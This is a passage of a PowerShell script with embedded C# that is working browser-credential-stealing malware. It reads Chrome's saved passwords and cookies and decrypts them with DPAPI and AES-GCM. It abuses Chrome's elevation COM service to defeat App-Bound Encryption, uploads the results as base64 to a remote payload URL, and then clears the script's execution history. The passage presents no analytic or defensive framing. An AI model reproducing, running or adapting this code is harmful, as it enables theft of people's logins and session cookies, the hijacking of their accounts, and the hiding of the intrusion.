            if (pinned.IsAllocated)
            {
                pinned.Free();
            }
        }

        return entries;
    }

    private static long ReadInt64(IntPtr stmt, int column)
    {
        return sqlite3_column_int64(stmt, column);
    }

    private static int ReadInt(IntPtr stmt, int column)
    {
        return sqlite3_column_int(stmt, column);
    }

    private static string ReadText(IntPtr stmt, int column)
    {
        IntPtr ptr = sqlite3_column_text(stmt, column);
        return ptr == IntPtr.Zero ? "" : Marshal.PtrToStringAnsi(ptr);
    }

    private static byte[] ReadBlob(IntPtr stmt, int column)
    {
        int length = sqlite3_column_bytes(stmt, column);
        if (length <= 0)
        {
            return null;
        }

        IntPtr ptr = sqlite3_column_blob(stmt, column);
        if (ptr == IntPtr.Zero)
        {
            return null;
        }

        var bytes = new byte[length];
        Marshal.Copy(ptr, bytes, 0, length);
        return bytes;
    }

    private static string BuildJson(List<PasswordEntry> passwords, List<CookieEntry> cookies)
    {
        var builder = new StringBuilder();
        builder.Append("{");
        builder.Append("\"hostname\":").Append(JsonString(Environment.MachineName)).Append(",");
        builder.Append("\"username\":").Append(JsonString(Environment.UserName)).Append(",");
        builder.Append("\"executedAt\":").Append(JsonString(DateTime.UtcNow.ToString("o"))).Append(",");
        builder.Append("\"passwordCount\":").Append(passwords.Count).Append(",");
        builder.Append("\"cookieCount\":").Append(cookies.Count).Append(",");
        builder.Append("\"passwords\":");
        AppendPasswordArray(builder, passwords);
        builder.Append(",\"cookies\":");
        AppendCookieArray(builder, cookies);
        builder.Append("}");
        return builder.ToString();
    }

    private static void AppendPasswordArray(StringBuilder builder, List<PasswordEntry> passwords)
    {
        builder.Append("[");

        for (int i = 0; i < passwords.Count; i++)
        {
            PasswordEntry entry = passwords[i];
            if (i > 0)
            {
                builder.Append(",");
            }

            AppendPasswordEntry(builder, entry);
        }

        builder.Append("]");
    }

    private static void AppendPasswordEntry(StringBuilder builder, PasswordEntry entry)
    {
        builder.Append("{");
        builder.Append("\"index\":").Append(entry.Index).Append(",");
        builder.Append("\"profile\":").Append(JsonString(entry.Profile)).Append(",");
        builder.Append("\"url\":").Append(JsonString(entry.Url)).Append(",");
        builder.Append("\"username\":").Append(JsonString(entry.Username)).Append(",");
        builder.Append("\"password\":").Append(JsonString(entry.Password)).Append(",");
        builder.Append("\"password_dpapi\":").Append(JsonString(entry.PasswordDpapi));
        builder.Append("}");
    }

    private static void AppendCookieArray(StringBuilder builder, List<CookieEntry> cookies)
    {
        builder.Append("[");

        for (int i = 0; i < cookies.Count; i++)
        {
            CookieEntry entry = cookies[i];
            if (i > 0)
            {
                builder.Append(",");
            }

            AppendCookieEntry(builder, entry);
        }

        builder.Append("]");
    }

    private static void AppendCookieEntry(StringBuilder builder, CookieEntry entry)
    {
        builder.Append("{");
        builder.Append("\"index\":").Append(entry.Index).Append(",");
        builder.Append("\"profile\":").Append(JsonString(entry.Profile)).Append(",");
        builder.Append("\"host\":").Append(JsonString(entry.Host)).Append(",");
        builder.Append("\"name\":").Append(JsonString(entry.Name)).Append(",");
        builder.Append("\"path\":").Append(JsonString(entry.Path)).Append(",");
        builder.Append("\"value\":").Append(JsonString(entry.Value)).Append(",");
        builder.Append("\"value_dpapi\":").Append(JsonString(entry.ValueDpapi)).Append(",");
        builder.Append("\"expires\":").Append(entry.Expires).Append(",");
        builder.Append("\"secure\":").Append(entry.Secure ? "true" : "false").Append(",");
        builder.Append("\"httpOnly\":").Append(entry.HttpOnly ? "true" : "false");
        builder.Append("}");
    }

    private static string JsonString(string value)
    {
        if (value == null)
        {
            return "null";
        }

        var builder = new StringBuilder(value.Length + 2);
        builder.Append('"');
        foreach (char ch in value)
        {
            switch (ch)
            {
                case '\\': builder.Append("\\\\"); break;
                case '"': builder.Append("\\\""); break;
                case '\b': builder.Append("\\b"); break;
                case '\f': builder.Append("\\f"); break;
                case '\n': builder.Append("\\n"); break;
                case '\r': builder.Append("\\r"); break;
                case '\t': builder.Append("\\t"); break;
                default:
                    if (ch < 32)
                    {
                        builder.Append("\\u");
                        builder.Append(((int)ch).ToString("x4"));
                    }
                    else
                    {
                        builder.Append(ch);
                    }
                    break;
            }
        }
        builder.Append('"');
        return builder.ToString();
    }

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_open(string filename, out IntPtr db);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_deserialize(IntPtr db, string schema, IntPtr data, long szDb, long szBuf, int flags);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_prepare_v2(IntPtr db, string sql, int nByte, out IntPtr stmt, IntPtr tail);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_step(IntPtr stmt);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern IntPtr sqlite3_column_text(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern IntPtr sqlite3_column_blob(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_column_bytes(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_column_int(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern long sqlite3_column_int64(IntPtr stmt, int iCol);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_finalize(IntPtr stmt);

    [DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
    private static extern int sqlite3_close_v2(IntPtr db);

    private sealed class PasswordEntry
    {
        public int Index;
        public string Profile;
        public string Url;
        public string Username;
        public string Password;
        public string PasswordDpapi;
    }

    private sealed class CookieEntry
    {
        public int Index;
        public string Profile;
        public string Host;
        public string Name;
        public string Path;
        public string Value;
        public string ValueDpapi;
        public long Expires;
        public bool Secure;
        public bool HttpOnly;
    }
}

public static class __COM_ELEVATOR_CLASS__
{
    private const uint CLSCTX_LOCAL_SERVER = 0x4;
    private const uint RPC_C_AUTHN_DEFAULT = 0xFFFFFFFF;
    private const uint RPC_C_AUTHZ_DEFAULT = 0xFFFFFFFF;
    private const uint RPC_C_AUTHN_LEVEL_PKT_PRIVACY = 6;
    private const uint RPC_C_IMP_LEVEL_IMPERSONATE = 3;
    private const uint EOAC_DYNAMIC_CLOAKING = 0x40;
    private const int COINIT_APARTMENTTHREADED = 0x2;
    private const int S_OK = 0;
    private const int S_FALSE = 1;
    private const int RPC_E_CHANGED_MODE = unchecked((int)0x80010106);
    private const int E_NOINTERFACE = unchecked((int)0x80004002);

    private static readonly Guid ChromeClsid = new Guid("708860E0-F641-4611-8895-7D867DD3675B");
    private static readonly Guid ChromeElevatorIid = new Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8");
    private static readonly Guid ChromeElevator2Iid = new Guid("1BF5208B-295F-4992-B5F4-3A9BB6494838");

    [ComImport]
    [Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IElevatorChrome
    {
        [PreserveSig]
        int RunRecoveryCRXElevated(
            [MarshalAs(UnmanagedType.LPWStr)] string crxPath,
            [MarshalAs(UnmanagedType.LPWStr)] string filePath,
            [MarshalAs(UnmanagedType.LPWStr)] string browserInstallPath,
            [MarshalAs(UnmanagedType.LPWStr)] string browserVersion,
            uint browserFlags,
            out IntPtr result);

        [PreserveSig]
        int EncryptData(
            int protectionLevel,
            IntPtr plaintext,
            out IntPtr ciphertext,
            out uint lastError);

        [PreserveSig]
        int DecryptData(
            IntPtr ciphertext,
            out IntPtr plaintext,
            out uint lastError);
    }

    [DllImport("ole32.dll")]
    private static extern int CoInitializeEx(IntPtr reserved, int coinit);

    [DllImport("ole32.dll")]
    private static extern void CoUninitialize();

    [DllImport("ole32.dll")]
    private static extern int CoCreateInstance(
        ref Guid clsid,
        IntPtr pUnkOuter,
        uint dwClsContext,
        ref Guid iid,
        out IntPtr ppv);

    [DllImport("ole32.dll")]
    private static extern int CoSetProxyBlanket(
        IntPtr pProxy,
        uint dwAuthnSvc,
        uint dwAuthzSvc,
        IntPtr pServerPrincName,
        uint dwAuthnLevel,
        uint dwImpLevel,
        IntPtr pAuthInfo,
        uint dwCapabilities);

    [DllImport("oleaut32.dll")]
    private static extern IntPtr SysAllocStringByteLen(byte[] str, uint len);

    [DllImport("oleaut32.dll")]
    private static extern void SysFreeString(IntPtr bstr);

    [DllImport("oleaut32.dll")]
    private static extern uint SysStringByteLen(IntPtr bstr);

    public static byte[] DecryptAppBoundKey(byte[] encryptedPayload, out string error)
    {
        error = null;
        bool comInitialized = false;
        IntPtr elevatorPtr = IntPtr.Zero;
        IntPtr bstrEnc = IntPtr.Zero;
        IntPtr bstrPlain = IntPtr.Zero;

        try
        {
            int hr = CoInitializeEx(IntPtr.Zero, COINIT_APARTMENTTHREADED);
            if (hr != S_OK && hr != S_FALSE && hr != RPC_E_CHANGED_MODE)
            {
                error = "1013";
                return null;
            }

            comInitialized = true;

            Guid clsid = ChromeClsid;
            Guid iid = ChromeElevator2Iid;
            hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_LOCAL_SERVER, ref iid, out elevatorPtr);
            if (hr == E_NOINTERFACE)
            {
                iid = ChromeElevatorIid;
                hr = CoCreateInstance(ref clsid, IntPtr.Zero, CLSCTX_LOCAL_SERVER, ref iid, out elevatorPtr);
            }

            if (hr != S_OK || elevatorPtr == IntPtr.Zero)
            {
                error = "1014";
                return null;
            }

            hr = CoSetProxyBlanket(
                elevatorPtr,
                RPC_C_AUTHN_DEFAULT,
                RPC_C_AUTHZ_DEFAULT,
                IntPtr.Zero,
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                RPC_C_IMP_LEVEL_IMPERSONATE,
                IntPtr.Zero,
                EOAC_DYNAMIC_CLOAKING);

            if (hr != S_OK)
            {
                error = "1015";
                return null;
            }

            IElevatorChrome elevator = (IElevatorChrome)Marshal.GetObjectForIUnknown(elevatorPtr);
            bstrEnc = SysAllocStringByteLen(encryptedPayload, (uint)encryptedPayload.Length);
            if (bstrEnc == IntPtr.Zero)
            {
                error = "1016";
                return null;
            }

            uint comErr;
            hr = elevator.DecryptData(bstrEnc, out bstrPlain, out comErr);
            if (hr != S_OK || bstrPlain == IntPtr.Zero)
            {
                error = "1017";
                return null;
            }

            uint len = SysStringByteLen(bstrPlain);
            var key = new byte[len];
            Marshal.Copy(bstrPlain, key, 0, (int)len);
            return key;
        }
        catch (Exception)
        {
            error = "1018";
            return null;
        }
        finally
        {
            if (bstrEnc != IntPtr.Zero) SysFreeString(bstrEnc);
            if (bstrPlain != IntPtr.Zero) SysFreeString(bstrPlain);
            if (elevatorPtr != IntPtr.Zero) Marshal.Release(elevatorPtr);
            if (comInitialized) CoUninitialize();
        }
    }
}

public static class __CRYPTO_CLASS__
{
    [StructLayout(LayoutKind.Sequential)]
    private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
    {
        public int cbSize;
        public int dwInfoVersion;
        public IntPtr pbNonce;
        public int cbNonce;
        public IntPtr pbAuthData;
        public int cbAuthData;
        public IntPtr pbTag;
        public int cbTag;
        public IntPtr pbMacContext;
        public int cbMacContext;
        public int cbAAD;
        public long cbData;
        public int dwFlags;
    }

    [DllImport("bcrypt.dll")]
    private static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId, [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptDestroyKey(IntPtr hKey);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);

    public static string DecryptPassword(byte[] secretKey, byte[] ciphertext, bool allowV20 = false)
    {
        if (ciphertext == null || ciphertext.Length < 31)
        {
            return "";
        }

        string version = Encoding.ASCII.GetString(ciphertext, 0, 3);
        if (version == "v20" && !allowV20)
        {
            return "[Chrome 127+ App-Bound Encryption - export from chrome://password-manager]";
        }

        if (version != "v10" && version != "v11" && version != "v20")
        {
            return "";
        }

        byte[] nonce = new byte[12];
        Array.Copy(ciphertext, 3, nonce, 0, 12);

        byte[] encryptedPassword = new byte[ciphertext.Length - 31];
        Array.Copy(ciphertext, 15, encryptedPassword, 0, encryptedPassword.Length);

        byte[] tag = new byte[16];
        Array.Copy(ciphertext, ciphertext.Length - 16, tag, 0, 16);

        byte[] plaintext = DecryptAesGcm(secretKey, nonce, encryptedPassword, tag);
        return Encoding.UTF8.GetString(plaintext);
    }

    private static byte[] DecryptAesGcm(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
    {
        IntPtr hAlgorithm = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;
        IntPtr noncePtr = IntPtr.Zero;
        IntPtr tagPtr = IntPtr.Zero;

        try
        {
            int status = BCryptOpenAlgorithmProvider(out hAlgorithm, "AES", null, 0);
            if (status != 0) throw new InvalidOperationException("1009");

            byte[] chainMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            status = BCryptSetProperty(hAlgorithm, "ChainingMode", chainMode, chainMode.Length, 0);
            if (status != 0) throw new InvalidOperationException("1010");

            status = BCryptGenerateSymmetricKey(hAlgorithm, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
            if (status != 0) throw new InvalidOperationException("1011");

            noncePtr = Marshal.AllocHGlobal(nonce.Length);
            Marshal.Copy(nonce, 0, noncePtr, nonce.Length);
            tagPtr = Marshal.AllocHGlobal(tag.Length);
            Marshal.Copy(tag, 0, tagPtr, tag.Length);

            var authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            authInfo.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
            authInfo.dwInfoVersion = 1;
            authInfo.pbNonce = noncePtr;
            authInfo.cbNonce = nonce.Length;
            authInfo.pbTag = tagPtr;
            authInfo.cbTag = tag.Length;

            byte[] plaintext = new byte[ciphertext.Length];
            int bytesWritten;
            status = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, ref authInfo, null, 0, plaintext, plaintext.Length, out bytesWritten, 0);
            if (status != 0) throw new InvalidOperationException("1012");

            if (bytesWritten != plaintext.Length)
            {
                Array.Resize(ref plaintext, bytesWritten);
            }

            return plaintext;
        }
        finally
        {
            if (noncePtr != IntPtr.Zero) Marshal.FreeHGlobal(noncePtr);
            if (tagPtr != IntPtr.Zero) Marshal.FreeHGlobal(tagPtr);
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlgorithm != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        }
    }
}
"@
$typeDefinition = $typeDefinition.Replace("__EXPORTER_CLASS__", $ChromeExporterClassName)
$typeDefinition = $typeDefinition.Replace("__COM_ELEVATOR_CLASS__", $ChromeComElevatorClassName)
$typeDefinition = $typeDefinition.Replace("__CRYPTO_CLASS__", $ChromeCryptoClassName)

Add-Type -ReferencedAssemblies System.Security -TypeDefinition $typeDefinition

Write-DebugStep "Add-Type completed"

$exporterType = [AppDomain]::CurrentDomain.GetAssemblies() |
    ForEach-Object { $_.GetType($ChromeExporterClassName) } |
    Where-Object { $_ } |
    Select-Object -First 1

if (-not $exporterType) {
    throw [System.InvalidOperationException]::new("Exporter type not found after Add-Type")
}

Write-DebugStep "Exporter type loaded: $($exporterType.FullName)"

$exportMethod = $exporterType.GetMethod("Export")
Write-DebugStep "Running Chrome export (UseDpapiDecrypt=$UseDpapiDecrypt)"
$payloadJson = $exportMethod.Invoke($null, @([bool]$UseDpapiDecrypt))
Write-DebugStep "Export completed (jsonLength=$($payloadJson.Length))"

Write-DebugStep "Parsing export JSON"
$payloadObject = $payloadJson | ConvertFrom-Json
$payloadObject | Add-Member -NotePropertyName chrome -NotePropertyValue ([pscustomobject]$ChromeInfo) -Force

Write-DebugStep "Reading Chrome profile metadata"
$profileMetadata = Get-ChromeProfileMetadata
$payloadObject | Add-Member -NotePropertyName profiles -NotePropertyValue ([pscustomobject]$profileMetadata) -Force

Write-DebugStep "Running chromelevator (UseChromelevator=$UseChromelevator)"
$chromelevatorMeta = Invoke-ChromelevatorExtraction -Payload $payloadObject -ApiBase $ApiBase
$payloadObject | Add-Member -NotePropertyName chromelevator -NotePropertyValue ([pscustomobject]$chromelevatorMeta) -Force
Write-DebugStep "Chromelevator finished (error=$($chromelevatorMeta.error), passwords=$($chromelevatorMeta.abeMergedCount), cookies=$($chromelevatorMeta.cookiesMergedCount))"

Write-DebugStep "Serializing payload"
$payloadJson = ConvertTo-JsonUnlimited -InputObject $payloadObject
Write-DebugStep "Serialization completed (jsonLength=$($payloadJson.Length))"

Write-DebugStep "Uploading payload to $PayloadUrl"
$payloadB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($payloadJson))
Write-DebugStep "Base64 encoded (length=$($payloadB64.Length))"
$null = Invoke-RestMethod -Uri $PayloadUrl -Method Post -ContentType "text/plain; charset=utf-8" -Body $payloadB64
Write-DebugStep "Payload upload completed"
}
catch {
    Write-DebugError $_
    $script:ExitCode = Get-ErrorCodeFromException $_
    Write-Host $script:ExitCode
}
finally {
    Clear-ScriptExecutionHistory
    if ($CloseTerminal) {
        if ($null -ne $script:ExitCode) {
            exit $script:ExitCode
        }
        exit
    }
}
